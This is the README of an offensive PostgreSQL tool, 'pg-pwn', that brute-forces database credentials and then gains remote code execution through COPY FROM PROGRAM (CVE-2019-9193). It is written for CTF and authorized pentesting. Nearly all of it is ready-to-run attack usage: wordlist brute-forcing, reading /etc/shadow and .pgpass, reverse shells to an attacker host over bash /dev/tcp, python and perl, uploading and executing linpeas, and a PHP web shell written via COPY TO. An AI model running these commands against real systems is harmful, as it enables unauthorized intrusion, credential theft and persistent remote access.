# pg-pwn — PostgreSQL Brute Force + RCE

All-in-one PostgreSQL exploitation tool for CTF and authorized pentesting. Combines credential brute-forcing with authenticated RCE via `COPY FROM PROGRAM` (CVE-2019-9193).

```
  ┌──────────────────────────────────────────────┐
  │  pg-pwn  — PostgreSQL Brute + RCE            │
  │  COPY FROM PROGRAM → shell (CVE-2019-9193)   │
  └──────────────────────────────────────────────┘
```

## How the RCE Works

PostgreSQL 9.3+ allows superusers to execute OS commands through the `COPY FROM PROGRAM` feature. This is **by design** — Postgres considers superuser access equivalent to OS-level access. The technique:

```sql
CREATE TABLE pwn(line text);
COPY pwn FROM PROGRAM 'id';          -- runs 'id' as the postgres OS user
SELECT line FROM pwn;                -- read the output
DROP TABLE pwn;                      -- cleanup
```

This is cataloged as CVE-2019-9193, though PostgreSQL's position is that it's a feature, not a bug. In CTF/pentest context, it's RCE the moment you have superuser credentials.

## What's Different From squid22/PostgreSQL_RCE

| Feature | squid22 original | pg-pwn |
|---|---|---|
| Credential brute-force | ✗ | ✓ wordlists + built-in defaults |
| One-shot command (`-x`) | ✗ (revshell only) | ✓ |
| Interactive shell | ✗ | ✓ |
| Reverse shell payloads | mkfifo only | mkfifo, bash, python, perl |
| Built-in listener | ✗ | ✓ `--listen` |
| Recon/fingerprinting | ✗ | ✓ version, superuser, roles, config |
| File upload | ✗ | ✓ via base64 chunks |
| Argparse CLI | ✗ (hardcoded) | ✓ full flags |
| Database selection | ✗ | ✓ `-d` |
| Error handling | bare try/except | per-query with useful messages |
| Cleanup | none | drops temp tables |

## Installation

```bash
git clone https://github.com/YOURUSER/pg-pwn.git
cd pg-pwn

# Install the only dependency
pip install psycopg2-binary
```

Requirements: Python 3.6+, `psycopg2-binary` (pure-Python, no libpq needed).

On Kali/Parrot, psycopg2 is usually preinstalled:
```bash
apt install python3-psycopg2   # alternative
```

## Usage

```
pg-pwn.py [-t TARGET] [mode] [options]

Modes:
  brute      Brute-force PostgreSQL credentials
  recon      Fingerprint the instance (version, users, config)
  exec       One-shot command execution
  shell      Interactive pseudo-shell
  revshell   Reverse shell via COPY FROM PROGRAM
  upload     Upload a file to the target
```

## Quick Examples

### Brute Force with Default Credentials

Tries 14 common postgres/admin credential pairs:

```bash
python3 pg-pwn.py brute -t 10.10.10.5
```

### Brute Force with Wordlists

```bash
# User list + password list
python3 pg-pwn.py brute -t 10.10.10.5 -U users.txt -P passwords.txt

# Single user, password list
python3 pg-pwn.py brute -t 10.10.10.5 -u postgres -P /usr/share/wordlists/rockyou.txt

# Find ALL valid creds (don't stop on first hit)
python3 pg-pwn.py brute -t 10.10.10.5 -U users.txt -P passes.txt --no-stop
```

### Recon

```bash
python3 pg-pwn.py recon -t 10.10.10.5 -u postgres -p postgres
```

Output:
```
[+] Connected as postgres to 10.10.10.5:5432/template1

[*] ═══ PostgreSQL Recon ═══
[*] Version: PostgreSQL 12.3 on x86_64-pc-linux-gnu
[*] User:    postgres (superuser: on)
[*] Datadir: /var/lib/postgresql/12/main
[*] Config:  /etc/postgresql/12/main/postgresql.conf
[*] Databases (3): postgres, webapp_db, secrets
[*] Roles (4):
    postgres              SUPERUSER, LOGIN
    webapp                LOGIN
    backup_user           CREATEDB, LOGIN
    pg_monitor
[*] Testing COPY FROM PROGRAM...
[+] COPY FROM PROGRAM works — RCE available!
```

### One-Shot Command

```bash
# Grab a flag
python3 pg-pwn.py exec -t 10.10.10.5 -u postgres -p postgres -x 'cat /etc/shadow'

# Network recon from the DB server
python3 pg-pwn.py exec -t 10.10.10.5 -u postgres -p postgres -x 'ip a && ss -tlnp'
```

### Interactive Shell

```bash
python3 pg-pwn.py shell -t 10.10.10.5 -u postgres -p postgres
```
```
[+] Interactive PostgreSQL shell — type 'exit' to quit
[*] Commands run via COPY FROM PROGRAM as the postgres OS user

pg-pwn(10.10.10.5)> id
uid=106(postgres) gid=113(postgres) groups=113(postgres),112(ssl-cert)
pg-pwn(10.10.10.5)> cat /var/lib/postgresql/.pgpass
pg-pwn(10.10.10.5)> ls -la /home/
pg-pwn(10.10.10.5)> exit
```

### Reverse Shell

With built-in listener (no separate nc needed):

```bash
python3 pg-pwn.py revshell -t 10.10.10.5 -u postgres -p postgres \
    --lhost 10.10.14.2 --lport 4444 --listen
```

With external listener:

```bash
# Terminal 1
nc -lvnp 4444

# Terminal 2
python3 pg-pwn.py revshell -t 10.10.10.5 -u postgres -p postgres \
    --lhost 10.10.14.2 --lport 4444
```

Choose your payload type if mkfifo isn't available:

```bash
# bash /dev/tcp (no nc needed on target)
python3 pg-pwn.py revshell -t 10.10.10.5 -u postgres -p postgres \
    --lhost 10.10.14.2 --lport 4444 --payload bash

# python3
python3 pg-pwn.py revshell ... --payload python

# perl
python3 pg-pwn.py revshell ... --payload perl
```

### Upload a File

Push tools onto the target through the database connection:

```bash
python3 pg-pwn.py upload -t 10.10.10.5 -u postgres -p postgres \
    --local-file linpeas.sh --remote-path /tmp/linpeas.sh

# Then make it executable and run it
python3 pg-pwn.py exec -t 10.10.10.5 -u postgres -p postgres \
    -x 'chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh'
```

## Full Walkthrough — CTF Flow

```bash
# 1. Nmap finds port 5432 open
nmap -sV -p 5432 10.10.10.5

# 2. Brute-force credentials
python3 pg-pwn.py brute -t 10.10.10.5
# [+] VALID → postgres:postgres

# 3. Recon — check if we're superuser and RCE works
python3 pg-pwn.py recon -t 10.10.10.5 -u postgres -p postgres
# [+] COPY FROM PROGRAM works — RCE available!

# 4. Grab flags
python3 pg-pwn.py exec -t 10.10.10.5 -u postgres -p postgres \
    -x 'find / -name "user.txt" -o -name "root.txt" 2>/dev/null'
python3 pg-pwn.py exec -t 10.10.10.5 -u postgres -p postgres \
    -x 'cat /home/user/user.txt'

# 5. Get a proper shell for pivoting
python3 pg-pwn.py revshell -t 10.10.10.5 -u postgres -p postgres \
    --lhost 10.10.14.2 --lport 4444 --listen
```

## Flags Reference

| Flag | Description |
|---|---|
| `-t`, `--target` | Target PostgreSQL host (required) |
| `--port` | PostgreSQL port (default: 5432) |
| `-d`, `--database` | Database to connect to (default: template1) |
| `-u`, `--user` | Single username |
| `-p`, `--password` | Single password |
| `-U`, `--user-file` | Username wordlist |
| `-P`, `--pass-file` | Password wordlist |
| `--no-stop` | Don't stop brute force after first hit |
| `-x`, `--cmd` | Command for exec mode |
| `--lhost` | Your IP for reverse shell |
| `--lport` | Your port for reverse shell |
| `--listen` | Start built-in reverse shell listener |
| `--payload` | Reverse shell type: mkfifo/bash/python/perl |
| `--local-file` | Local file path for upload mode |
| `--remote-path` | Remote destination for upload mode |
| `--timeout` | Connection timeout in seconds (default: 5) |
| `-v`, `--verbose` | Show all brute force attempts |

## When COPY FROM PROGRAM Fails

If COPY FROM PROGRAM is blocked (not superuser, or feature restricted), there are alternative RCE paths:

**1. UDF via Large Objects (works on older versions):**
Upload a malicious shared library (.so/.dll) via `pg_largeobject`, export it to disk with `lo_export()`, then `CREATE FUNCTION` pointing at it. See [HackTricks — RCE with PostgreSQL Extensions](https://book.hacktricks.wiki/en/pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.html).

**2. Writing files via COPY TO:**
```sql
COPY (SELECT '<?php system($_GET["c"]); ?>') TO '/var/www/html/shell.php';
```

**3. Reading sensitive files:**
```sql
CREATE TABLE loot(line text);
COPY loot FROM '/etc/passwd';
SELECT * FROM loot;
```

## References

- [squid22/PostgreSQL_RCE](https://github.com/squid22/PostgreSQL_RCE) — original tool
- [CVE-2019-9193 / EDB-50847](https://www.exploit-db.com/exploits/50847) — PostgreSQL authenticated RCE
- [HackTricks — PostgreSQL Injection](https://book.hacktricks.wiki/en/pentesting-web/sql-injection/postgresql-injection/) — comprehensive PostgreSQL attack reference
- [b4keSn4ke CVE-2019-9193](https://github.com/b4keSn4ke/CVE-2019-9193) — another implementation

## Disclaimer

For authorized security testing and CTF competitions only.
